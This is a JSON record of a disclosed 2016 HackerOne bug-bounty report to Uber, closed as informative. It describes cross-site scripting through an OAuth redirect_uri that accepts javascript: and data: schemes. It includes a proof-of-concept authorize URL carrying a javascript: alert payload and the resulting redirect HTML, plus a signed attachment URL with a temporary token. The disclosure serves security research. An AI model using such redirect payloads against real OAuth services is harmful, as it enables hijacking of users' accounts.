{
  "id": 131052,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzEwNTI=",
  "url": "https://hackerone.com/reports/131052",
  "title": "XSS in uber oauth",
  "state": "Closed",
  "substate": "informative",
  "readable_substate": "Informative",
  "created_at": "2016-04-15T10:57:56.042Z",
  "submitted_at": "2016-04-15T10:57:56.042Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "zombiehelp54",
    "url": "/zombiehelp54",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/mevfgipw1pc7n4wy86swdq1yaeuq/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 314,
    "url": "https://hackerone.com/uber",
    "handle": "uber",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Uber",
      "twitter_handle": "",
      "website": "https://www.uber.com",
      "about": ""
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-07-26T00:27:22.726Z",
  "bug_reporter_agreed_on_going_public_at": "2016-06-29T17:10:40.292Z",
  "team_member_agreed_on_going_public_at": "2016-07-26T00:27:22.596Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi , I have found that when setting a `redirect_uri` for an application you validate for the presence of `://` in the beginning of the url , but you don't validate for the protocol and you don't block malicious protocols such as `javascript:` pseudo protocol and `data:` URIs.\nAlthough the redirecting is done through `location` header , there still some cases in which this can be harmful to users and can be used to hijack users' accounts , moreover , `data:` URIs work on some modern browsers such as firefox. \nThis also can be very harmful to users who chose to disable 302 redirection on their browser.\n\n#PoC:\n\nThis PoC will work on latest version of opera mini mobile browser and it will also work on firefox with 302 redirection disabled. \n\n- Go to https://login.uber.com/oauth/authorize?client_id=MXeE1dl-5R3yTCbufMHsfz3KhfY2UGyS&response_type=code&scope=profile&redirect_uri=javascript:%2F%2Fgoog.com%2F%250Aalert%28document.domain%29%3B%2F%2F\n- Click the Allow or the Deny button\n- The response will be:\n \n```\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n<title>Redirecting...</title>\n<h1>Redirecting...</h1>\n<p>You should be redirected automatically to target URL: <a href=\"javascript://goog.com/%0Aalert(document.domain);//?error=access_denied#_\">javascript://goog.com/%0Aalert(document.domain);//?error=access_denied#_</a>.  If not click the link.\n```\n- As you can see , this will trigger XSS . \nI have attached a screenshot of XSS triggered on firefox (latest version) with 302 redirection disabled. \n\nThe PoC will also work on old Mozilla and opera browsers , in browsers Mozilla 1.7.x (and previous versions) and Mozilla Firefox 3.0.12 , The browser will show “Object Moved” page. click on the link “here” and the code will execute.\n\nThanks\n\n",
  "weakness": {
    "id": 60,
    "name": "Cross-site Scripting (XSS) - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 85789,
      "file_name": "uber_oauth_xss.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/085/789/b3e6edc589f267e162083fa958443cc3da10cdb9/uber_oauth_xss.png?response-content-disposition=attachment%3B%20filename%3D%22uber_oauth_xss.png%22%3B%20filename%2A%3DUTF-8%27%27uber_oauth_xss.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5K4CFL6A%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T141418Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCYilKPljfy6d%2Fups7sbfI05lNTSCPerWA8BmMSr0K8mwIhAJbm7Q3%2FLhEDaL3Xja8i5P0nnq3d0bKXf4TMx33qKEwRKrIFCC4QAxoMMDEzNjE5Mjc0ODQ5Igw0AWLipiOqypgJ5e0qjwXjqiiVlICidYCaC2wicFRnR9ZgUhs9l5EXeEPuHJ7Uv1xJxJ8zdasr2oFifjTdo47vOb73CE%2FxoyJYWWwSnS%2FXPNC4d0ma0cm8zm17lb9WL9zcZDvjhR8dla9WoTzWKnZA7d%2Be%2B%2ByKIIjyokFkQ%2BYd8A91XZ7jnsTEsMhl4iQGYX4iAm02CUVFpYd%2FDHz2egzPQZ3mRipRFmB1Jrvf%2B%2FrmnsFZgW0z4Cu2TfobLPdv0ArppomsmvwiTZ%2BIaHnfCtAVPOOJsoBNjtxVx1pqR%2B7QSWrAjslYd%2F%2FbYxWNhz7tU1OY23b7rX%2F4gNJQRkB2o%2BBHeCGNHK4ZOa8swftT25d556WXXf8FCEWcn0FrSvrfAaBOlCHCWkHyTVNuEKaHArLCPaEN3GV%2FA2bX8oBOGpbS6NjEQLKQuBI6%2F4yvvziN9HGEcC9RBqYJLkk9%2BE0KX3Io42SymhCtB%2Fj73RHZCD8r5bzWKU2P6t9qi5cYRF3fV0tmQXcHBx7JweTirqjsRemXbW3v40mfEJh4QYG16bprkeuTquvTFjVHO1fpkD%2BGmCciB4LkMHO1DQ7UGEa2sXHuDK1zmMz5DzONPdZna4t3jZSGUjYCH%2FJjpS4SEJOh%2F7%2FYXNXhAjjdzI5%2F9HY6nOnVdGe1em1pUgfqZnZpgccDAMult98XgIu8rPqgXYgbWiVwrfkEBstCTtIDIyiozx%2F29teBdlXdbx%2Fq2kGXsqWQ%2FxN1dCljuISU48amf9LTdSKBUA7nJyK%2B%2FyG1TcYYYu3%2BuHMfmqG996qTban8tQNq7bxNl87IMJEyLXKrW3fKQK40eBsexGsz9Py%2Fc1f0mxCoIubD4n%2FNgoPwwtMO4iix1zHrANjEgj%2FoW%2BR%2BKyBQML2NxcYGOrAB27tgSDKRnZZYHoj24eJTY24wQsVxkEkPWmsOm0XIhRFybH1H5SVDa6Rse4VRAHLjIAw1GuB7RxcO1abF06LMGegDCRd2pRaFG930%2FExPRb7c9yU%2BbHNFMjNgtZQYc4jh6pqhtwZZZNXQcZsMzkEJduAZuDtlOOUa9oF3AwPAfP9XYGClV7ARLi4Sg1lxAVGaUdU2nKJu60csWHaQqHooymgBF837MtmUzpdJGlYT4dQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e70caed125a8566091b3b1162e087ad56f6810a158747c337cdbf0b4ee9412df",
      "file_size": 80158,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 5,
  "voters": [
    "leet-boy",
    "pr0f0x01",
    "sumit7",
    "spetr0x",
    "dyabla"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
